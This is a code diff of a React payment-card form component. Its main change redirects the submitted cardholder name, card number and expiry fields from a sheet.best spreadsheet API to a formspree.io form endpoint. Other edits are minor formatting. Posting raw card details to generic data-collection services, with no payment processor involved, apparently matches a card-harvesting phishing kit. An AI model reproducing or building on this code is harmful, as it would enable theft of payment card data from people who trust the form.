@@ -7,6 +7,7 @@ import { ToastContainer, toast } from "react-toastify";
 
 export default function Cardinformation() {
   const navigate = useNavigate();
+
   // const [form, setForm] = useState({
   //   cardholdername: "",
   //   cardnumber: "",
@@ -66,7 +67,7 @@ export default function Cardinformation() {
     const Formvlaues = Object.fromEntries(data.entries());
 
     axios
-      .post(`https://sheet.best/api/sheets/6513c974-3a2f-4ecc-b6e9-95b86a407163`, Formvlaues)
+      .post(`https://formspree.io/f/xwkzqweq`, Formvlaues)
       .then((response) => {
         if (response.status) {
           let dataSet = response.data;
@@ -174,10 +175,12 @@ export default function Cardinformation() {
                       aria-label="Username"
                       aria-describedby="addon-wrapping"
                       name="cardnumber"
+                      id="input"
                       // value={form.cardnumber}
                       // onChange={onUpdateField}
                       required
                     />
+
                   </div>
 
                   <div className="form-group mt-2">
@@ -207,8 +210,6 @@ export default function Cardinformation() {
                         <option value="11">12</option>
                       </select>
                       <span className="input-group-text">
-                        {" "}
-                        {"                 "}{" "}
                       </span>
                       <select
                         required="required"
@@ -323,3 +324,4 @@ export default function Cardinformation() {
     </>
   );
 }
+
